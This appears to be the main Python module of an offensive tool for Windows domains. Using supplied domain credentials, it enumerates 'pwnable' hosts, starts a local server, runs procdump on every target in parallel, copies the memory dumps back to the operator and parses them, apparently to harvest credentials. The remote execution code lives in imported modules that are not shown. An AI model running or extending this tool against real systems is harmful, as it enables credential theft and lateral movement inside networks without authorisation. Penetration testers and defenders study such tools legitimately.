# coding: utf-8

# Author:	Lyderic LEFEBVRE
# Twitter:	@lydericlefebvre
# Mail:		lylefebvre.infosec@gmail.com
# LinkedIn:	https://www.linkedin.com/in/lydericlefebvre


# Imports
import logging, queue
from core.User import *
from core.Server import *
from core.Resources import *
from core.Targets import *
from core.SprayLove import *
from core.ParseDump import *
from core.Colors import *
from core.Utils import *
from multiprocessing import Process, Queue

def run(args):
    jobs = []
    q = Queue()

    user = User(args.domain, args.username, args.password)
    local_ip = retrieveMyIP()
    alea = gen_random_string(5).upper()

    server = Process(target=launchServer, args=(q, local_ip, alea, args.verbosity, args.server))

    try:
        targets = listPwnableTargets(args.targets, user)
        server.start()

        try:
            if q.get(True, 3) == -1:
                pass
        except queue.Empty:
            logging.info("%sServer launched successfully." % (infoYellow))
            logging.warning("%sExec procdump on targets, and retrieve dumps locally into %smisc/dumps%s. Be patients..." % (warningGre, green, white))

            for target in targets:
                jobs.append(Process(target=sprayLove, args=(user, target, args.methods, local_ip, alea)))
                jobs[-1].start()

            joinThreads(server, jobs, args.wait)
            parseDumps(dumpDir)
    except KeyboardInterrupt:
        logging.warning("%sKeyboard interrupt. Exiting." % (warningRed))
    except Exception as e:
        logging.warning("%sErr: %s" % (warningRed, e))
    finally:
        exit_gracefully(server,jobs, args.keep)

